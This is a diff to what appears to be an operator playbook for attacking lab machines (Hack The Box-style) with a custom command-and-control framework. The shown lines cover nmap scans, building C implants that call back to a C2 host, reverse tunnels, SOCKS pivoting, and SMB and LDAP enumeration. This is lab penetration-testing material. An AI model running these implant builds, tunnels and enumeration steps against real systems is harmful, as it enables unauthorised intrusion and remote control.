@@ -45,6 +45,8 @@ Ask if missing: machine name, target IP, domain (if AD), VPN status, whether imp
 ### 1. Pre-flight
 
 ```bash
+# VPN + C2 reachability (do this before ldap/smb/kerberos)
+./build/erebus inbound status
 # VPN must be up (user runs openvpn)
 ip -br a show tun0 2>/dev/null
 nmap -Pn -n -p 445,389,88,5985,5986,22,80,443 --open <TARGET_IP>
@@ -67,7 +69,7 @@ make implant-c CALLBACK_URL=https://<C2_REACHABLE>:8443 \
 # Linux primary (C) — default after Linux foothold:
 make implant-c-linux CALLBACK_URL=https://<C2_REACHABLE>:8443 \
   CA_CERT_PATH=$HOME/.erebus/ca-cert.pem SLEEP_MS=500 JITTER_PCT=10
-# If host blocks tun0: CALLBACK_URL=https://127.0.0.1:8443 + scripts/htb_reverse_tunnel.sh user@TARGET
+# If host blocks tun0: CALLBACK_URL=https://127.0.0.1:8443 + erebus inbound tunnel user@TARGET
 ```
 
 Drop implant after initial shell (WinRM/SSH/etc.) when testing C2. **Prefer C** on both OS; Go only with a one-line justification (e.g. reverse SOCKS until C M4c). Interactive lab: low sleep OK; kill implant and stop listeners when done.  
@@ -78,6 +80,8 @@ Linux plan: `docs/plans/SPRINT_L_C_LINUX.md`.
 Host-side first when there is no implant / WinRM is filtered:
 
 ```bash
+# If operator cannot reach the DC, SOCKS first:
+#   erebus op socks start --port 1080 && eval "$(./build/erebus inbound env)"
 ./build/erebus smb shares --host <IP> --anon
 ./build/erebus ldap enum --dc <IP> --domain DOM --user u --pass-file ./p --type interesting
 ./build/erebus ldap dangling --dc <IP> --domain DOM --user u --pass-file ./p
